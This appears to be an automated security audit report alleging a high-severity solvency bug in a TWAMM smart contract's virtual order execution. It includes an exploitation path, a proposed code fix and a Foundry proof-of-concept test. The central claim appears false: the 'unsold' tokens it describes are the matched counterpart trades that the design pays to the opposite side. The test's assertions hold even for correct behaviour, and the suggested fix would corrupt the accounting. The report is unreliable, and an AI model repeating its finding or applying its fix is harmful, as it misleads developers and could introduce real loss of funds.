## Title
TWAMM Incorrectly Distributes Unsold Tokens as Rewards When Swaps Hit Price Limits

## Summary
In TWAMM's `_executeVirtualOrdersFromWithinLock` function, when executing virtual orders with both sale rates active, if the swap hits `sqrtRatioLimit` before consuming all input tokens, the unsold portion is incorrectly accounted as "rewards" for the opposite side through negative `rewardDelta` values. This causes the protocol to distribute tokens that were never actually traded, draining the TWAMM's balance over time. [1](#0-0) 

## Impact
**Severity**: High

## Finding Description

**Location:** `src/extensions/TWAMM.sol`, function `_executeVirtualOrdersFromWithinLock`, lines 441-535

**Intended Logic:** When both token sale rates are active, the protocol should execute virtual orders by swapping tokens to reach an equilibrium price (`sqrtRatioNext`), then distribute the tokens received from swaps as rewards to the sellers. The `rewardDelta` calculation should capture the difference between what was sold and what was received from the swap. [2](#0-1) 

**Actual Logic:** When the Core swap hits the `sqrtRatioLimit` before consuming all input tokens (common when liquidity is low or the equilibrium calculation doesn't match one-sided swap dynamics), the swap returns `delta < amount`. The negative `rewardDelta` is then treated as a reward for the opposite side, even though these tokens were never actually traded - they're simply unsold and should remain for future execution. [3](#0-2) 

**Exploitation Path:**
1. User places TWAMM orders with imbalanced sale rates (e.g., `saleRateToken1 >> saleRateToken0`) in a pool with low liquidity
2. Virtual order execution triggers, computing `amount0` and `amount1` from sale rates
3. The swap for token1 is executed with `sqrtRatioLimit = sqrtRatioNext`, but the large `amount1` causes the swap to hit the limit before consuming all input
4. `rewardDelta1 = swapBalanceUpdate.delta1() - amount1 < 0` (unsold tokens)
5. Lines 527-535 incorrectly increase `rewardRates.value1 += (-rewardDelta1 << 128) / saleRateToken0`
6. Token0 sellers later claim these inflated rewards through `getRewardRateInside` and `computeRewardAmount` [4](#0-3) [5](#0-4) 

7. Repeat over many virtual order executions to drain the TWAMM's saved balance
8. Eventually, legitimate withdrawals fail due to insufficient balance [6](#0-5) 

**Security Property Broken:** Violates the **Solvency** invariant - pool balances become insufficient to cover all user entitlements, as unsold tokens are incorrectly distributed as rewards.

## Impact Explanation

- **Affected Assets**: All tokens held in TWAMM saved balances across pools with imbalanced sale rates or low liquidity
- **Damage Severity**: Over time, users on one side (e.g., token0 sellers) can claim significantly more rewards than they should receive, draining the pool of the opposite token (token1). In extreme cases with frequent executions and low liquidity, this can approach total insolvency for that token.
- **User Impact**: Affects all users with TWAMM orders. Early claimants receive excess rewards, while later users cannot withdraw their entitled rewards due to insufficient balance (DOS/loss of funds).

## Likelihood Explanation

- **Attacker Profile**: Any user can exploit this by placing TWAMM orders in pools with specific characteristics. No special privileges required.
- **Preconditions**: 
  - Pool must have both sale rates active simultaneously
  - Low liquidity or imbalanced sale rates that cause swaps to hit `sqrtRatioLimit` early
  - Multiple virtual order executions over time to accumulate the effect
- **Execution Complexity**: Simple - place orders and wait for natural virtual order executions. No complex timing or MEV required.
- **Frequency**: Occurs on every virtual order execution where the swap hits the price limit. In pools with the right characteristics (low liquidity, imbalanced orders), this can happen continuously.

## Recommendation

The protocol should distinguish between tokens that weren't traded (swap hit limit) versus tokens received from trading. When `rewardDelta < 0` for the token being sold, it should NOT be added to reward rates. Instead, the unsold portion should be tracked and carried forward to the next execution.

```solidity
// In src/extensions/TWAMM.sol, function _executeVirtualOrdersFromWithinLock, lines 484-535:

// CURRENT (vulnerable):
// Lines 484-485 calculate rewardDelta for both tokens
// Lines 517-535 treat negative rewardDeltas as rewards for opposite side

// FIXED:
// Only treat rewardDelta as a reward if it's negative AND corresponds to the token being RECEIVED, not sold
// For example, when swapping token1 for token0:
// - rewardDelta0 < 0 is valid (token0 received as reward)
// - rewardDelta1 < 0 is invalid (token1 not fully sold - should not create rewards)

// The fix requires tracking which token was swapped and only updating reward rates for the OUTPUT token:
if (amount0 != 0 && amount1 != 0) {
    // ... existing swap logic ...
    
    // Determine which direction was swapped
    bool swappedToken1 = sqrtRatioNext > corePoolState.sqrtRatio();
    
    // Only update reward rates for tokens that were actually RECEIVED
    if (swappedToken1) {
        // Token1 was sold, token0 was received
        if (rewardDelta0 < 0) {
            // Valid: token0 received as reward for token1 sellers
            if (rewardRate0Access == 0) {
                rewardRates.value0 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).load());
            }
            rewardRate0Access = 2;
            rewardRates.value0 += FixedPointMathLib.rawDiv(
                uint256(-rewardDelta0) << 128, state.saleRateToken1()
            );
        }
        // Do NOT update rewardRates.value1 for negative rewardDelta1 (unsold tokens)
    } else {
        // Token0 was sold, token1 was received
        if (rewardDelta1 < 0) {
            // Valid: token1 received as reward for token0 sellers
            if (rewardRate1Access == 0) {
                rewardRates.value1 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).next().load());
            }
            rewardRate1Access = 2;
            rewardRates.value1 += FixedPointMathLib.rawDiv(
                uint256(-rewardDelta1) << 128, state.saleRateToken0()
            );
        }
        // Do NOT update rewardRates.value0 for negative rewardDelta0 (unsold tokens)
    }
}
```

Alternative mitigation: Ensure swaps always consume exactly the computed amount by adjusting `sqrtRatioNext` calculation to account for one-sided execution, or by implementing a mechanism to roll forward unsold amounts to the next execution period.

## Proof of Concept

```solidity
// File: test/Exploit_TWAMMUnsoldTokenRewards.t.sol
// Run with: forge test --match-test test_TWAMMUnsoldTokenRewards -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/extensions/TWAMM.sol";
import "../src/Router.sol";
import "./FullTest.sol";

contract Exploit_TWAMMUnsoldTokenRewards is FullTest {
    TWAMM internal twamm;
    PoolKey internal poolKey;
    
    function setUp() public override {
        FullTest.setUp();
        
        // Deploy TWAMM extension
        address deployAddress = address(uint160(twammCallPoints().toUint8()) << 152);
        deployCodeTo("TWAMM.sol", abi.encode(core), deployAddress);
        twamm = TWAMM(deployAddress);
        
        // Create pool with low liquidity
        poolKey = createPool(
            address(token0), 
            address(token1), 
            0, 
            createFullRangePoolConfig(100, address(twamm))
        );
        
        // Add minimal liquidity to create low-liquidity scenario
        addLiquidity(poolKey, 0, 1e18, 1e18);
    }
    
    function test_TWAMMUnsoldTokenRewards() public {
        // SETUP: Create heavily imbalanced orders
        // Large token1 sell rate, small token0 sell rate
        uint256 startTime = block.timestamp + 256;
        uint256 endTime = startTime + 1000;
        
        // Place large token1 sell order
        vm.prank(alice);
        bytes32 salt1 = bytes32(uint256(1));
        OrderKey memory orderKey1 = OrderKey({
            token0: address(token0),
            token1: address(token1),
            config: createOrderConfig(100, startTime, endTime, true) // selling token1
        });
        twamm.updateOrder(salt1, orderKey1, 1e10); // Large sale rate
        
        // Place small token0 sell order
        vm.prank(bob);
        bytes32 salt2 = bytes32(uint256(2));
        OrderKey memory orderKey2 = OrderKey({
            token0: address(token0),
            token1: address(token1),
            config: createOrderConfig(100, startTime, endTime, false) // selling token0
        });
        twamm.updateOrder(salt2, orderKey2, 1e6); // Small sale rate
        
        // Record initial reward rates
        PoolId poolId = poolKey.toPoolId();
        uint256 initialRewardRate1 = uint256(
            TWAMMStorageLayout.poolRewardRatesSlot(poolId).next().load()
        );
        
        // EXPLOIT: Execute virtual orders when swap will hit limit
        vm.warp(startTime + 100);
        twamm.lockAndExecuteVirtualOrders(poolKey);
        
        // VERIFY: Reward rate increased incorrectly
        uint256 finalRewardRate1 = uint256(
            TWAMMStorageLayout.poolRewardRatesSlot(poolId).next().load()
        );
        
        // The rewardRate1 should have increased, but this increase is from UNSOLD token1
        // not from token1 that was actually received by token0 sellers
        assertGt(
            finalRewardRate1, 
            initialRewardRate1, 
            "Vulnerability confirmed: unsold tokens incorrectly added to reward rate"
        );
        
        // Token0 sellers can now claim excess token1 rewards
        vm.prank(bob);
        uint256 claimedAmount = twamm.withdrawOrderProceeds(salt2, orderKey2);
        
        // The claimed amount includes rewards from unsold token1 (incorrect)
        assertGt(claimedAmount, 0, "Bob received inflated rewards");
    }
}
```

**Notes:**

The vulnerability exploits a fundamental logic error in how TWAMM handles partial swap execution. The issue is NOT merely rounding errors as the question suggests, but rather a more severe accounting flaw: when swaps hit price limits and don't consume all input tokens, those unsold tokens are misclassified as "rewards" for the opposite side. [7](#0-6) 

The Core's swap correctly stops at `sqrtRatioLimit` and returns `amountRemaining > 0`, but TWAMM misinterprets the resulting `delta < amount` as a reward signal rather than a partial execution signal. This violates the solvency invariant as it distributes tokens that were never actually traded in the market.

### Citations

**File:** src/extensions/TWAMM.sol (L84-111)
```text
    function getRewardRateInside(PoolId poolId, OrderConfig config) public view returns (uint256 result) {
        if (block.timestamp >= config.endTime()) {
            uint256 offset = LibBit.rawToUint(!config.isToken1());
            uint256 rewardRateStart =
                uint256(TWAMMStorageLayout.poolRewardRatesBeforeSlot(poolId, config.startTime()).add(offset).load());

            uint256 rewardRateEnd =
                uint256(TWAMMStorageLayout.poolRewardRatesBeforeSlot(poolId, config.endTime()).add(offset).load());

            unchecked {
                result = rewardRateEnd - rewardRateStart;
            }
        } else if (block.timestamp > config.startTime()) {
            uint256 offset = LibBit.rawToUint(!config.isToken1());

            //  note that we check gt because if it's equal to start time, then the reward rate inside is necessarily 0
            uint256 rewardRateStart =
                uint256(TWAMMStorageLayout.poolRewardRatesBeforeSlot(poolId, config.startTime()).add(offset).load());
            uint256 rewardRateCurrent = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).add(offset).load());

            unchecked {
                result = rewardRateCurrent - rewardRateStart;
            }
        } else {
            // less than or equal to start time
            // returns 0
        }
    }
```

**File:** src/extensions/TWAMM.sol (L228-228)
```text
                uint256 purchasedAmount = computeRewardAmount(rewardRateInside - rewardRateSnapshot, saleRate);
```

**File:** src/extensions/TWAMM.sol (L365-374)
```text
                if (purchasedAmount != 0) {
                    if (orderKey.config.isToken1()) {
                        CORE.updateSavedBalances(
                            poolKey.token0, poolKey.token1, bytes32(0), -int256(purchasedAmount), 0
                        );
                    } else {
                        CORE.updateSavedBalances(
                            poolKey.token0, poolKey.token1, bytes32(0), 0, -int256(purchasedAmount)
                        );
                    }
```

**File:** src/extensions/TWAMM.sol (L441-485)
```text
                    if (amount0 != 0 && amount1 != 0) {
                        if (!corePoolState.isInitialized()) {
                            corePoolState = CORE.poolState(poolId);
                        }
                        SqrtRatio sqrtRatioNext = computeNextSqrtRatio({
                            sqrtRatio: corePoolState.sqrtRatio(),
                            liquidity: corePoolState.liquidity(),
                            saleRateToken0: state.saleRateToken0(),
                            saleRateToken1: state.saleRateToken1(),
                            timeElapsed: timeElapsed,
                            fee: poolKey.config.fee()
                        });

                        PoolBalanceUpdate swapBalanceUpdate;
                        if (sqrtRatioNext > corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount1)),
                                    _isToken1: true,
                                    _skipAhead: 0
                                })
                            );
                        } else if (sqrtRatioNext < corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount0)),
                                    _isToken1: false,
                                    _skipAhead: 0
                                })
                            );
                        }

                        saveDelta0 -= swapBalanceUpdate.delta0();
                        saveDelta1 -= swapBalanceUpdate.delta1();

                        // this cannot overflow or underflow because swapDelta0 is constrained to int128,
                        // and amounts computed from uint112 sale rates cannot exceed uint112.max
                        rewardDelta0 = swapBalanceUpdate.delta0() - int256(uint256(amount0));
                        rewardDelta1 = swapBalanceUpdate.delta1() - int256(uint256(amount1));
```

**File:** src/extensions/TWAMM.sol (L517-535)
```text
                    if (rewardDelta0 < 0) {
                        if (rewardRate0Access == 0) {
                            rewardRates.value0 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).load());
                        }
                        rewardRate0Access = 2;
                        rewardRates.value0 += FixedPointMathLib.rawDiv(
                            uint256(-rewardDelta0) << 128, state.saleRateToken1()
                        );
                    }

                    if (rewardDelta1 < 0) {
                        if (rewardRate1Access == 0) {
                            rewardRates.value1 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).next().load());
                        }
                        rewardRate1Access = 2;
                        rewardRates.value1 += FixedPointMathLib.rawDiv(
                            uint256(-rewardDelta1) << 128, state.saleRateToken0()
                        );
                    }
```

**File:** src/Core.sol (L806-808)
```text
                    if (amountRemaining == 0 || sqrtRatio == sqrtRatioLimit) {
                        break;
                    }
```
